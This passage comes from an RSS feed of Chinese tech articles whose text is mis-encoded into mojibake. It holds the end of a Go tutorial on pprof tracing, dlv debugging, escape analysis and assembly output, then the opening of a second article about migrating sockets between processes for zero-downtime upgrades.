data-line=&quot;1605&quot;&gt;&lt;span&gt;åŒæ ·å¼•å…¥åŒ…&lt;/span&gt;&lt;code&gt;&lt;span&gt;net/http/pprof&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1606&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å¼•å…¥pprofåŒ…&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// _ä»£è¡¨åªæ‰§è¡ŒåŒ…å†…çš„initå‡½æ•°&lt;/span&gt;&lt;br/&gt;_ &lt;span&gt;&quot;net/http/pprof&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å…¨å±€å˜é‡ä¸ä¼šåƒPHPä¸€æ ·ï¼Œåœ¨å®Œæˆä¸€æ¬¡è¯·æ±‚ä¹‹åè¢«é”€æ¯&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£é€»è¾‘&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;GlobalVarDemo++&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;&lt;span&gt;// å†å¼€å¯ä¸€ä¸ªç«¯å£è·å–pprofæ•°æ®&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;http.ListenAndServe(&lt;span&gt;&quot;:8888&quot;&lt;/span&gt;, &lt;span&gt;nil&lt;/span&gt;)&lt;br/&gt;}()&lt;br/&gt;&lt;span&gt;// å¯åŠ¨webæœåŠ¡&lt;/span&gt;&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1640&quot;&gt;&lt;span&gt;å¯åŠ¨æœåŠ¡åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1642&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;1. &lt;br/&gt;ç”Ÿæˆtrace.outæ–‡ä»¶å‘½ä»¤ï¼š&lt;br/&gt;curl http://localhost:8888/debug/pprof/trace?seconds=20 &amp;gt; trace.out&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;å’Œä¸Šé¢å‘½ä»¤åŒæ—¶æ‰§è¡Œï¼Œæ¨¡æ‹Ÿè¯·æ±‚ï¼Œä¹Ÿå¯ä»¥ç”¨abï¼š&lt;br/&gt;siege -c 50 -t 100 &quot;http://localhost:8080/ping&quot;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;span&gt;2. åˆ†ætrace.outæ–‡ä»¶å‘½ä»¤ï¼š&lt;br/&gt;go tool trace -http=127.0.0.1:8000 trace.out&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;å¿«æ·å¥ï¼š&lt;br/&gt;w æ”¾å¤§&lt;br/&gt;e å³ç§»&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.3962962962962963&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeVDNIh1DalmLYMpTyxK3O1pIwJE9zZ2XeXuLL7cFtWnNEv58u4eL6pQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt;Â &lt;/span&gt;&lt;img data-ratio=&quot;0.5425925925925926&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMe53CzJstdfoYA1c3d0lusPN2kibiblf1ibfa0icDRRibnnJKiaTaHaSpNzh9g/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt;Â &lt;/span&gt;&lt;img data-ratio=&quot;0.5202702702702703&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeBgXO1VgyDU8XFh5mq78nOv6rY43v0o53iccmUU12LjdlAWHlRZPODGQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;888&quot;/&gt;&lt;span&gt;Â &lt;/span&gt;&lt;img data-ratio=&quot;0.4064814814814815&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMedSZp6Prb6omfsVPMRghFrYgWhIVVZOudtEM1oDGACZkA3re9Uld5icw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt;Â &lt;/span&gt;&lt;img data-ratio=&quot;0.20555555555555555&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeRDkibLiamKTJgZzuibJayUiboSlQWAwystXjg64vVrzyo11MQ6TDdKUhIw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h2 data-line=&quot;1666&quot;&gt;&lt;span&gt;9.3 dlvå·¥å…·çš„ä½¿ç”¨&lt;/span&gt;&lt;/h2&gt;&lt;h3 data-line=&quot;1668&quot;&gt;&lt;span&gt;9.3.1 åŸºå‡†æµ‹è¯•åœºæ™¯&lt;/span&gt;&lt;/h3&gt;&lt;p data-line=&quot;1670&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šæ–­ç‚¹è°ƒè¯•ç­‰ã€‚&lt;/span&gt;&lt;/p&gt;&lt;p data-line=&quot;1672&quot;&gt;&lt;span&gt;å®‰è£…ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1674&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;go install github.com/go-delve/delve/cmd/dlv@latest&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1678&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1681&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;_ &lt;span&gt;&quot;net/http/pprof&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å…¨å±€å˜é‡ä¸ä¼šåƒPHPä¸€æ ·ï¼Œåœ¨å®Œæˆä¸€æ¬¡è¯·æ±‚ä¹‹åè¢«é”€æ¯&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£é€»è¾‘&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;GlobalVarDemo++&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1707&quot;&gt;&lt;span&gt;å‘½ä»¤è¡Œæ‰§è¡Œå‘½ä»¤:&lt;/span&gt;&lt;/p&gt;&lt;blockquote data-line=&quot;1709&quot;&gt;&lt;p data-line=&quot;1709&quot;&gt;&lt;span&gt;dlv debug main.go&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1711&quot;&gt;&lt;span&gt;è¿›å…¥è°ƒè¯•ï¼Œå¸¸ç”¨è°ƒè¯•å‘½ä»¤ï¼š&lt;/span&gt;&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;ï¼ˆlistæˆ–lï¼šè¾“å‡ºä»£ç ï¼‰&lt;/span&gt;&lt;span&gt;ï¼šlist main.go:16&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;ï¼ˆbreakæˆ–bï¼šæ–­ç‚¹å‘½ä»¤ï¼‰&lt;/span&gt;&lt;span&gt;ï¼šæ‰§è¡ŒÂ &lt;/span&gt;&lt;code&gt;&lt;span&gt;break main.go:16&lt;/span&gt;&lt;/code&gt;&lt;span&gt;Â ç»™è¡ŒÂ &lt;/span&gt;&lt;code&gt;&lt;span&gt;GlobalVarDemo++&lt;/span&gt;&lt;/code&gt;&lt;span&gt;æ‰“æ–­ç‚¹&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;ï¼ˆcontinueæˆ–cï¼šç»§ç»­æ‰§è¡Œï¼‰&lt;/span&gt;&lt;span&gt;ï¼šcontinue&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;ï¼ˆprintæˆ–pï¼šæ‰“å°å˜é‡ï¼‰&lt;/span&gt;&lt;span&gt;ï¼š&lt;/span&gt;&lt;code&gt;&lt;span&gt;print GlobalVarDemo&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;ï¼ˆstepæˆ–sï¼šå¯ä»¥è¿›å…¥å‡½æ•°ï¼‰&lt;/span&gt;&lt;span&gt;ï¼šstep&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-line=&quot;1719&quot;&gt;&lt;span&gt;æ›´å¤šå‘½ä»¤è¯·æ‰§è¡ŒÂ &lt;/span&gt;&lt;code&gt;&lt;span&gt;help&lt;/span&gt;&lt;/code&gt;&lt;span&gt;ã€‚&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1721&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;æ¨¡æ‹Ÿè¯·æ±‚ï¼š&lt;br/&gt;curl http://localhost:8080/ping&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.48055555555555557&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMe7yLibnOW7FxE8FdgDgMGlCcmhIXyPnt59IBbMeaqgkx4JNWglAgJpLA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.5601851851851852&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeTmA1oqAump1NREGckhHXwZ5NWTj8xetTnxwM1VWlNBXWvEeIianrgSA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h3 data-line=&quot;1734&quot;&gt;&lt;span&gt;9.3.2 WebæœåŠ¡åœºæ™¯&lt;/span&gt;&lt;/h3&gt;&lt;p data-line=&quot;1736&quot;&gt;&lt;span&gt;è¿˜æ˜¯è¿™ä¸ªdemo&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1737&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å…¨å±€å˜é‡ä¸ä¼šåƒPHPä¸€æ ·ï¼Œåœ¨å®Œæˆä¸€æ¬¡è¯·æ±‚ä¹‹åè¢«é”€æ¯&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£é€»è¾‘&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;GlobalVarDemo++&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;&lt;span&gt;// å¯åŠ¨webæœåŠ¡&lt;/span&gt;&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;æ‰¾åˆ°æœåŠ¡è¿›ç¨‹IDÂ &lt;/span&gt;&lt;code&gt;&lt;span&gt;lsof -i :8080&lt;/span&gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;dlvè°ƒè¯•è¿›ç¨‹Â &lt;/span&gt;&lt;code&gt;&lt;span&gt;dlv attach 36968&lt;/span&gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;è¿›å…¥è°ƒè¯•æ¨¡å¼ï¼Œè°ƒè¯•ä»£ç ï¼ˆå’Œä¸Šé¢ä¸€æ ·ï¼‰&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 data-line=&quot;1766&quot;&gt;&lt;span&gt;9.4(æ‰©å±•) é€ƒé€¸åˆ†æ&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1768&quot;&gt;&lt;p data-line=&quot;1768&quot;&gt;&lt;span&gt;é€ƒé€¸åˆ†æå‘½ä»¤ï¼šgo build -gcflags &quot;-m -l&quot; *.go&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;1770&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Demo &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;DemoFun()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;DemoFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; *&lt;span&gt;Demo&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demo := &amp;amp;Demo{}&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; demo&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// # command-line-arguments&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ./main.go:11:10: &amp;amp;Demo literal escapes to heap &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; å±€éƒ¨å˜é‡å†…å­˜è¢«åˆ†é…åˆ°å †ä¸Š&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1789&quot;&gt;&lt;span&gt;9.5(æ‰©å±•) æ±‡ç¼–ä»£ç &lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1791&quot;&gt;&lt;p data-line=&quot;1791&quot;&gt;&lt;span&gt;ç›´æ¥ç”Ÿæˆæ±‡ç¼–ä»£ç å‘½ä»¤ï¼š&lt;/span&gt;&lt;span&gt;go run -gcflags -S main.go&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;1793&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;# command-line-arguments&lt;br/&gt;&quot;&quot;.main STEXT nosplit size=1 args=0x0 locals=0x0&lt;br/&gt;        0x0000 00000 (.../demo/main.go:6)  TEXT    &quot;&quot;.main(SB), NOSPLIT|ABIInternal, $0-0&lt;br/&gt;        0x0000 00000 (.../demo/main.go:6)  FUNCDATA        $0, gclocalsÂ·33cdeccccebe80329f1fdbee7f5874cb(SB)&lt;br/&gt;        0x0000 00000 (.../demo/main.go:6)  FUNCDATA        $1, gclocalsÂ·33cdeccccebe80329f1fdbee7f5874cb(SB)&lt;br/&gt;        0x0000 00000 (.../demo/main.go:6)  FUNCDATA        $2, gclocalsÂ·33cdeccccebe80329f1fdbee7f5874cb(SB)&lt;br/&gt;        0x0000 00000 (&amp;lt;unknown line number&amp;gt;)    RET&lt;br/&gt;        0x0000 c3       &lt;br/&gt;ç•¥......&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;1805&quot;&gt;&lt;p data-line=&quot;1805&quot;&gt;&lt;span&gt;è·å–ç”Ÿæˆæ±‡ç¼–ä»£ç æ•´ä¸ªä¼˜åŒ–è¿‡ç¨‹ï¼š&lt;/span&gt;&lt;span&gt;GOSSAFUNC=main go build main.go&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;1808&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;dumped SSA to ./ssa.html &amp;lt;------- ç”Ÿæˆçš„æ–‡ä»¶ï¼Œæµè§ˆå™¨æ‰“å¼€æ­¤æ–‡ä»¶&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-croporisrc=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeH09lTQfX5PVUocYSh4Y8JYQKcT7KORQqWMMSIrshGPuiaBbzvHQDJJg/640?wx_fmt=png&quot; data-cropx1=&quot;0&quot; data-cropx2=&quot;1080&quot; data-cropy1=&quot;0&quot; data-cropy2=&quot;325.924276169265&quot; data-ratio=&quot;0.30092592592592593&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_jpg/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeJKE70dEYloiawV9T8WfYhTNaKc6vd4yFkFfWgKqiauw2uKm04IKibqG0A/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span/&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;Goè½»æ¾è¿›é˜¶ç³»åˆ—&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;Â æ›´å¤šæ–‡ç« &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;1&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/TiccVmMZ3icdgDGUicDlY5kWW5P7CL4n2Uf7xYPLAEo3zFQxsYSDeHbticPicM8eJnZia0HM6pFhFK0rVmKKX0X4CbBg/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages&quot; data-ratio=&quot;0.06302521008403361&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdjOmxkheVnwCeibLWia2yTSSAnu4wH1RgmdCrGrIicz5oicSN5gbZxKaiaZ3oicxDC3iaOCm92d2VjbqGMmw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;714&quot;/&gt;&lt;/p&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-tools-id=&quot;36694&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;img data-ratio=&quot;1.375&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_gif/TiccVmMZ3icdiazAwOwey9wAIliamDeGicTOXib4HFynOX3BUxJMO7b4Azq3fNx3JgEwKU3NMG3N2hLLfIsqCUJMd43w/640?wx_fmt=gif&quot; data-type=&quot;gif&quot; data-w=&quot;40&quot;/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span/&gt;&lt;/p&gt;
                &lt;/div&gt;

                

                



                
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>1a0eb615b29ee31c5457a6f228090296</guid>
<title>é»‘ç§‘æŠ€è§£å¯†ï¼å®ç° Socket è¿›ç¨‹é—´è¿ç§»</title>
<link>https://toutiao.io/k/wzbyfev</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages&quot; data-backh=&quot;174&quot; data-backw=&quot;365&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.4767123287671233&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_gif/cvQbJDZsKLp6wejHtKTRbqqQyt0wMk9K1wNtuwRqQTJAPOJ1KiaqSeSRbIJRTicVicKpDKRndBodY2DBNN20tvWwA/640?wx_fmt=gif&quot; data-type=&quot;gif&quot; data-w=&quot;365&quot;/&gt;&lt;/p&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;åŸåˆ›ï¼šå°å§å§å‘³é“ï¼ˆå¾®ä¿¡å…¬ä¼—å·IDï¼šxjjdogï¼‰ï¼Œæ¬¢è¿åˆ†äº«ï¼Œè½¬è½½è¯·ä¿ç•™å‡ºå¤„ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä»Šå¤©ä»‹ç»ä¸€ä¸ªå¯ä»¥æ‹¿å‡ºå»å¹ç‰›çš„åŠŸèƒ½ï¼šå®ç°socketå¥æŸ„åœ¨è¿›ç¨‹ä¹‹é—´è¿ç§»ï¼ä¸ºäº†è¿™ç¯‡æ–‡ç« ï¼Œxjjdogå¯ç®—ä¸‹äº†è‹¦åŠŸå¤«ï¼ŒåŠå¤œè¿˜åœ¨ç¿»èµ„æ–™ã€‚å› ä¸ºéœ€è¦éªŒè¯åï¼Œæ‰èƒ½è¯æ˜è¿™é¡¹æŠ€æœ¯ç¡®å®æ˜¯æ­£ç¡®çš„ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ­£æ–‡ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šï¼Œè¿è¡Œç€å¤§é‡çš„serverå®ä¾‹ï¼ˆinstanceï¼‰ã€‚è¿™äº›instanceï¼Œæ¯ä¸ªéƒ½è¦æ‰¿è½½ç€æ•°åä¸‡çš„è¿æ¥å’Œéå¸¸ç¹å¿™çš„ç½‘ç»œè¯·æ±‚ã€‚èƒ½å¤ŸæŠŠè¿™æ ·çš„è¿æ¥æ•°ï¼Œè¿™æ ·çš„æµé‡ï¼Œç©å¼„äºè‚¡æŒä¹‹é—´ï¼Œæ˜¯æ¯ä¸ªäº’è”ç½‘ç¨‹åºå‘˜çš„æ¢¦æƒ³ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä½†è½¯ä»¶æ€»æ˜¯è¦å‡çº§çš„ï¼Œæ¯å½“å‡çº§çš„æ—¶å€™ï¼Œå°±éœ€è¦å…ˆåœæ‰åŸæ¥çš„instanceï¼Œç„¶åå†å¯åŠ¨ä¸€ä¸ªæ–°çš„ã€‚åœ¨è¿™ä¸€åœä¸€èµ·ä¹‹é—´ï¼Œæ•°åç§’å°±è¿‡å»äº†ï¼Œæ›´ä¸è¦è¯´JAVAè¿™ç§å¯åŠ¨æ—¶é—´å°±èƒ½ç”Ÿä¸ªå­©å­çš„é€Ÿåº¦äº†ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä¼ ç»Ÿçš„åšæ³•ï¼Œæ˜¯å…ˆæŠŠè¿™ä¸ªinstanceä»è´Ÿè½½å‡è¡¡ä¸Šé¢æ‘˜é™¤ï¼Œç„¶åå¯åŠ¨èµ·æ¥å†åŠ ä¸Šï¼›å¯¹äºå¾®æœåŠ¡æ¥è¯´ï¼Œå°±è¦å…ˆéš”ç¦»ï¼Œç„¶åå¯åŠ¨åå†å–æ¶ˆéš”ç¦»ã€‚è¿™äº›æ“ä½œï¼Œå¯¹äºæµ·é‡åº”ç”¨æ¥è¯´ï¼Œå°±æ˜¯ä¸ªå™©æ¢¦ã€‚&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;1. é›¶åœæœºæ›´æ–°&lt;/h2&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•ï¼Œèƒ½å¤ŸæŠŠä¸€ä¸ªè¿›ç¨‹æ‰€æŒ‚è½½çš„è¿æ¥ï¼ˆsocketï¼‰ï¼Œè½¬ç§»åˆ°å¦å¤–ä¸€ä¸ªè¿›ç¨‹ä¹‹ä¸Šå‘¢ï¼Ÿè¿™æ ·ï¼Œæˆ‘åœ¨å‡çº§çš„æ—¶å€™ï¼Œå°±å¯å¯ä»¥å…ˆå¯åŠ¨ä¸€ä¸ªå‡çº§ç‰ˆæœ¬çš„è¿›ç¨‹ï¼Œç„¶åæŠŠè€è¿›ç¨‹çš„socketï¼Œone by oneçš„ç»™è½¬ç§»è¿‡å»ã€‚&lt;/p&gt;&lt;p 